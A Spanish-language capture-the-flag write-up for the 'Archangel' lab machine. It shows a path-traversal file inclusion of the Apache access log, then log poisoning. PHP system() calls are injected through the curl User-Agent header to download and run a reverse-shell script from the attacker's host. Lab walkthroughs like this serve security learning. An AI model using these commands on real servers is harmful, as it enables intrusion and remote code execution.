La máquina [[MAQUINA ARCHANGEL (Fuzzing, Local File Inclusion con wrappers, log poissoning y manipulación del PATH)]] tiene esta vulnerabilidad en esta ruta:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../././var/log/apache2/access.log
```

![[Pasted image 20240612233112.png]]

Por tanto, una vez visto esto, podemos intentar hacer un log poisoning, de tal forma que si probamos en ejecutar una petición con curl podemos inyectar texto dentro del apartado del user agent:
```bash
curl -s -X GET 'http://mafialive.thm' -H 'User-Agent:Pruebas'
```

![[Pasted image 20240612233124.png]]

Pero ahora si dentro del user-agent inyectamos un código php malicioso para ejecutar comandos, veremos que funciona:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
```

![[Pasted image 20240612233133.png]]

Una vez hecho esto, montamos un servidor http con python y nos compartimos un fichero para enviarnos una reverse shell:
![[Pasted image 20240612233138.png]]

![[Pasted image 20240612233143.png]]
Y entonces ahora ejecutamos el comando wget para obtener este archivo y después bash pwned.sh para ejecutarlo y recibir la reverse shell:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://10.8.100.91/pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('chmod 777 pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('bash pwned.sh'); ?>"
```
Una vez ejecutado lo anterior, refrescamos y habremos recibido la reverse shell:
![[Pasted image 20240612233150.png]]

Y habremos recibido la reverse shell:

![[Pasted image 20240612233153.png]]